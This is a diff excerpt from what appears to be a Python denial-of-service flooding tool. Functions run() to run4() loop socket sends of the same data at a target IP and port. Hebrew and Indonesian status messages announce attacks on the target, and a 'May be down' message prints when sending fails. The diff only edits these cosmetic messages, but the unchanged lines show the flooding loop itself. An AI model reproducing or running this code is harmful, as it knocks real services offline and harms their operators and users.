@@ -94,7 +94,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print("[+]  \033[32mTCP   \033[33mנפגע על ידי סערה מדברית\033[0m " +ip+ "")
+			print("[+]  \033[32mTCP  \033[33mנפגע על ידי סערה מדברית\033[0m  " +ip+ "")
 		except:
 			print("[-]  \033[31mMay be down\033[0m")
 
@@ -108,7 +108,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print("[*]  \033[96mPermintaan \033[92mPengiriman \033[34mPesan \033[33m" +ip+ "\033[0m")
+			print("[*]  \033[96mPermintaan \033[92mPengiriman Pesan  \033[33m" +ip+ "\033[0m")
 		except:
 			s.close()
 			print("[-]  \033[31mMay be down\033[0m")
@@ -123,7 +123,7 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print("[#]  \033[32mMemulai Serangan \033[95mDg target \033[94m" +ip+ "\033[0m")
+			print("[#]  \033[32mMemulai Serangan  \033[95mDg target \033[94m" +ip+ "\033[0m")
 		except:
 			s.close()
 			print("[-]  \033[31mMay be down\033[0m")
@@ -138,7 +138,7 @@ def run4():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print("[×]  \033[32mMulai  \033[33mMengikis  \033[32m" +ip+ "\033[0m")
+			print("[×]  \033[97m---------------------------------------------------\033[0m")
 		except:
 			s.close()
 			print("[-]  \033[31mMay be down\033[0m")
